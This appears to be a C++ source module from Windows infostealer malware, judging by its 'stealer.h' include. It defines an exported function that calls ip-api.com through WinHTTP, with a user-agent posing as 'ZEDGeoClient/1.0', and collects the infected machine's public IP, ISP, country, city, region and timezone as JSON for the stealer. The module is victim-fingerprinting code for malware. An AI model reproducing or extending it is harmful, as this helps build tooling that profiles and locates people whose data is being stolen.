#include "stealer.h"
#include <windows.h>
#include <winhttp.h>
#include <string>
#include <sstream>
#include <cstring>

#pragma comment(lib, "winhttp.lib")

// ── HTTP GET helper ───────────────────────────────────────────────────────────

static std::string http_get(const wchar_t* host, INTERNET_PORT port, const wchar_t* path, bool https) {
    std::string result;

    HINTERNET hSession = WinHttpOpen(L"ZEDGeoClient/1.0",
                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME,
                                     WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return result;

    HINTERNET hConnect = WinHttpConnect(hSession, host, port, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return result; }

    DWORD flags = https ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path,
                                             nullptr, WINHTTP_NO_REFERER,
                                             WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return result;
    }

    if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                           WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
        WinHttpReceiveResponse(hRequest, nullptr))
    {
        DWORD avail = 0;
        while (WinHttpQueryDataAvailable(hRequest, &avail) && avail > 0) {
            std::string chunk(avail, '\0');
            DWORD read = 0;
            WinHttpReadData(hRequest, chunk.data(), avail, &read);
            result.append(chunk.data(), read);
        }
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return result;
}

// ── Minimal JSON string extractor ─────────────────────────────────────────────

static std::string json_str(const std::string& json, const std::string& key) {
    std::string search = "\"" + key + "\":\"";
    size_t pos = json.find(search);
    if (pos == std::string::npos) return "";
    pos += search.size();
    size_t end = pos;
    while (end < json.size() && json[end] != '"') {
        if (json[end] == '\\') end++;
        end++;
    }
    return json.substr(pos, end - pos);
}

static std::string escape_json(const std::string& s) {
    std::string out;
    for (unsigned char c : s) {
        if (c == '"')  { out += "\\\""; }
        else if (c == '\\') { out += "\\\\"; }
        else if (c < 0x20) { char buf[8]; snprintf(buf, sizeof(buf), "\\u%04x", c); out += buf; }
        else out += (char)c;
    }
    return out;
}

// ── Exported function ─────────────────────────────────────────────────────────

extern "C" int zed_network_get_geo(char* out_json, int buf_size) {
    // ip-api.com free endpoint — HTTP (port 80), no API key required
    std::string raw = http_get(L"ip-api.com", 80, L"/json", false);
    if (raw.empty()) {
        const char* fallback = "{\"ip\":\"\",\"country\":\"\",\"isp\":\"\",\"city\":\"\",\"region\":\"\",\"timezone\":\"\"}";
        strncpy_s(out_json, buf_size, fallback, _TRUNCATE);
        return 0;
    }

    // ip-api.com returns JSON with these fields directly
    // e.g.: {"status":"success","country":"...","city":"...","isp":"...","query":"1.2.3.4",...}
    std::string ip       = json_str(raw, "query");
    std::string country  = json_str(raw, "country");
    std::string isp      = json_str(raw, "isp");
    std::string city     = json_str(raw, "city");
    std::string region   = json_str(raw, "regionName");
    std::string timezone = json_str(raw, "timezone");
    std::string cc       = json_str(raw, "countryCode");

    std::ostringstream j;
    j << "{"
      << "\"ip\":\""       << escape_json(ip)       << "\","
      << "\"country\":\""  << escape_json(country)  << "\","
      << "\"country_code\":\"" << escape_json(cc)   << "\","
      << "\"isp\":\""      << escape_json(isp)      << "\","
      << "\"city\":\""     << escape_json(city)     << "\","
      << "\"region\":\""   << escape_json(region)   << "\","
      << "\"timezone\":\"" << escape_json(timezone) << "\""
      << "}";

    std::string result = j.str();
    int copy_len = ((int)result.size() < buf_size - 1) ? (int)result.size() : buf_size - 1;
    memcpy(out_json, result.c_str(), copy_len);
    out_json[copy_len] = '\0';
    return 1;
}
